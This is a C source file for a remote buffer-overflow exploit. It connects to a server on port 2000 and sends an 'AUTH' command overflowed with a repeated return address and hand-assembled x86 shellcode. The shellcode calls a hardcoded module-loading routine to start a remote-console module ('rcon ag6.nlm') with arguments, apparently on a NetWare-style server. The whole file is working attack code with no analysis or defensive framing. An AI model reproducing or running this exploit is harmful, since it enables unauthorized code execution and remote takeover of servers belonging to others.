#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


#define DORET  "\x85\x78\x42\xfc"
#define BOFBUF 32
#define ALIGN  5

char payload[]=
             "\xba\xff\xff\xff\xff"      // mov edx,0xffffffff
             "\x42"		 	 // inc edx
             "\x52"			 // push edx
             "\x68\x6e\x6c\x6d\x20"      // push 0x206D6C6E    //nlm 
             "\x68\x61\x67\x36\x2e"      // push 0x2E366761    //ag6.
             "\x68\x72\x63\x6f\x6e"      // push 0x6E6F6372    //rcon
             "\x89\xe0"		         // mov eax,esp
             "\x52"			 // push edx
             "\x68\x36\x38\x30\x30"      // push 0x30303836    //6800
             "\x68\x34\x20\x20\x31"  	 // push 0x31202034    //4  1
             "\x68\x20\x32\x30\x33"   	 // push 0x33303220    // 203
             "\x68\x74\x65\x73\x74"  	 // push 0x74736574    //test
             "\x68\x6e\x6c\x6d\x20"  	 // push 0x206D6C6E    //nlm 
             "\x68\x61\x67\x36\x2e"  	 // push 0x2E366761    //ag6.
             "\x68\x72\x63\x6f\x6e"  	 // push 0x6E6F6372    //rcon
             "\x89\xe3"		         // mov ebx,esp
             "\x52"			 // push edx
             "\x53"			 // push ebx
             "\x50"			 // push eax
             "\xb8\x44\x72\x04\xfc"      // mov eax,0xfc047244  // loadmodule
             "\xff\xd0"		         // call eax
             "\x4d" 			 // dec ebp
             "\x4d" 			 // dec ebp
             "\x4d" 			 // dec ebp
             "\x4d" 			 // dec ebp
             "\x8b\x45\x04"  	         // mov eax,[ebp+4]
             "\x45" 			 // inc ebp
             "\x45" 			 // inc ebp
             "\x45" 			 // inc ebp
             "\x45" 			 // inc ebp
			                               //add eax,0x1ad
             "\xbb\xff\xff\xff\xff"	 //mov ebx,0xFFFFFFFF
             "\xb9\x52\xfe\xff\xff"      //mov ecx,0xFFFFFE52
             "\x29\xcb"		         //sub ebx,ecx
             "\x01\xd8"		         //add eax,ebx

             "\xff\xe0"	          	 //jmp eax
             ;

int main() { 
    struct sockaddr_in addr;
    int addrlen;
    int s,i; 
    char baf[256]="AUTH ";
    char tmpbuf[256];


    if((s=socket(AF_INET, SOCK_STREAM, 0))<0) {
        printf("socket#1");
        return -1;
    }

    addrlen=sizeof(addr);
    memset(&addr, 0, addrlen);
    addr.sin_family=AF_INET;

    addr.sin_addr.s_addr=inet_addr("172.17.1.250");
    addr.sin_port=htons(2000);
    
    printf("do connecting..\n");

    if( connect(s, (struct sockaddr *)&addr, addrlen) <0 ){
        printf("connected#1\n");
	return -1;
    };

    printf("connect\n");

    memset(tmpbuf,0,sizeof(tmpbuf));
    recv(s,tmpbuf,256,0);
    printf("SRV ANSW: %s",tmpbuf);    


    for (i=0;i<BOFBUF+4;i=i+4){
         memcpy(baf+ALIGN+i,DORET,4);
    };
    memcpy(baf+ALIGN+BOFBUF+4,payload,strlen(payload));
    send(s,baf,sizeof(baf),0);


    memset(tmpbuf,0,sizeof(tmpbuf));
    recv(s,tmpbuf,256,0);
    printf("SRV ANSW: %s",tmpbuf);    
    
    close(s); 

    return 0;
}

